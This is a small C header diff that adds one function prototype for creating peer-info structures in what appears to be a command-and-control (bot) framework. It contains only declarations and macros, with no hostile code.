@@ -42,6 +42,7 @@ struct sLaika_authInfo
 #define GETBINFOFROMPEER(x) ((struct sLaika_botInfo *)x->uData)
 #define GETAINFOFROMPEER(x) ((struct sLaika_authInfo *)x->uData)
 
+struct sLaika_peerInfo *laikaC_newPeerInfo(struct sLaika_cnc *cnc);
 struct sLaika_botInfo *laikaC_newBotInfo(struct sLaika_cnc *cnc);
 struct sLaika_authInfo *laikaC_newAuthInfo(struct sLaika_cnc *cnc);
 void laikaC_freePeerInfo(struct sLaika_peer *peer, struct sLaika_peerInfo *pInfo);
